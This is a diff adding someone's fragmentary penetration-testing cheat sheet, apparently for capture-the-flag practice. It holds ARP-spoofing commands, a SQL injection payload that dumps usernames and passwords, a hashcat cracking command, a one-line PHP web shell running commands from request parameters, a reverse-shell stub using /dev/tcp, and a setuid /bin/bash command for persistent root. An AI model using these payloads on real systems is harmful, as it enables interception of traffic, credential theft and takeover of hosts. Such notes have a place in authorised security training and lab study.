@@ -1,0 +1,125 @@
+# (PART) Temporary Notes {-}
+
+## MITM ARP Spoofing {-}
+
+**ARP** is a protocol used to resolve network interface MAC addresses, this is used by computer to resolve host IP addresses to a mac address.
+After performing an ARP run, hosts store the resoluting MAC addresse in a ARP cache table to avoid further useless ARP runs. If an Attacker is 
+able to manipulate the ARP cache, he is also able to intercept traffic on a network, even a switched network.
+
+Attacker steps:
+
+1. Configure ip forwarding 
+    ```bash
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    ```
+1. Run Arpspoof tool 
+    ```bash
+    arpspoof -i eth0 -t <target_ip> -r <address of webserver>
+    ```
+
+> [ ! ] NOTE: everything sniffing on this kind of attack can be checked with Wireshark
+
+
+
+
+## Enumeration {-}
+
+
+```bash
+openssl s_client -connect 
+```
+
+
+
+### websites {-}
+
+exploit-db.com  
+gtfobins.github.io  
+https://github.com/danielmiessler/SecLists
+wrapper lsi base64
+rosettacode.org/wiki/Execute_a_system_command
+pentestmonkey.net
+hashcat wiki
+Chisel github for port forwarding
+payloadsAllTheTings github
+seccure python github -> encryption
+crackstation
+gtfobins.github.io
+shankro github
+cirt.net/passwords -> default credentials
+
+
+> [ ! ] Note: /etc/hosts for virtual hosting when direct ip not allowed
+
+
+
+
+## priviledge Escalation {-}
+
+```bash
+id
+#result
+adm
+
+
+cd /var/logs
+find \-group adm \-type f 2>/dev/null | grep -v "\.gz" | xargs grep -E -i "post"
+```
+
+
+## sounds {-}
+
+audacity
+
+bloodhound &< /dev/null &
+
+
+upx brute para reducir la tailla del binario
+
+
+```bash
+    &>/dev/null -> for no output printing
+    2>/dev/null -> for no stderr printing
+```
+
+
+
+
+```bash
+10.10.10.96/users/'union select group_concat(username, : ,password) from users_gbw-- -
+
+hashcat -m 10900 -a 0 hashes /usr/share/wordlists/rockyou.txt
+hashid
+```
+> [ ! ] Note: ${IFS} or %20 for spaces
+
+website:
+
+
+
+when php disabled function are fully:
+
+if putenv() o mail()
+
+
+<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+
+extentions for php
+
+Todo
+
+bash -i >& /dev/tcp
+
+backup bck back old swp ~
+
+# compile with go {-}
+(pspy)
+
+go build -ldflags "-s -w" .
+
+chmod u+s /bin/bash
+
+which curl
+which wget
+
+wget -qO- <ip>
